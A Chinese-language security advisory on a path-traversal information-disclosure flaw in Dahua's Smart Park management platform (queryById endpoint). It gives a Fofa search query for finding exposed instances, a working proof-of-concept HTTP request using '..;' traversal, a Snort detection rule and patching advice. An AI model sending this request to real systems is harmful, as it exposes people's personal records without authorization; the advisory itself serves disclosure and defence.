# 大华-智慧园区综合管理平台 queryById 存在信息泄露漏洞

大华-智慧园区综合管理平台 queryById 存在信息泄露漏洞

# 影响版本

**V3.001.0000004.18.R.2223994 及以下版本**

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**Fofa:**  **app=&quot;dahua-智慧园区综合管理平台&quot;**

**POC/EXP：**

**step1** **信息泄露**

```
POST /CardSolution/card/visitor/appointment/..;/..;/..;/card/person/queryById HTTP/1.1
Host: 127.0.0.1
Accept-Encoding: gzip
Connection: keep-alive
Content-Length: 9
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15

{"id":8}
```

​![image](assets/image-20260901235405-rcamwf1.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"大华-智慧园区综合管理平台 - /card/person/queryById 信息泄露漏洞 (路径遍历绕过)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/card/person/queryById"; fast_pattern;
    http.uri; content:"..;"; distance:0;
    http.content_type; content:"application/json";
    http.request_body; content:"\"id\""; nocase;
    metadata:
        service http,
        affected_product "大华-智慧园区综合管理平台",
        vulnerability_type "Information Disclosure via Path Traversal",
        severity "high";
    classtype:web-application-attack;
    sid:1000736;
    rev:1;
    priority:2;
)
```

# 漏洞修复

1. **首选方案：安装官方补丁**  
    这是最彻底的修复方式。请联系厂商获取安全更新，或访问官方支持网站：[`https://support.dahuatech.com/afterSales`](https://support.dahuatech.com/afterSales)​。
2. **临时加固措施（升级前）**

    * **限制网络访问**：通过防火墙策略，**严格限制对**  **​`/CardSolution/`​** ​ **路径下所有接口的访问**，仅允许可信IP。
    * **部署WAF规则**：在Web应用防火墙（WAF）上配置规则，**拦截对**  **​`/CardSolution/card/person/queryById`​**​ **等敏感接口的异常请求**。
    * **加强监控审计**：**立即检查系统日志**，重点排查对 `/CardSolution/`​ 路径的可疑访问，特别是批量、高频的查询请求。

‍
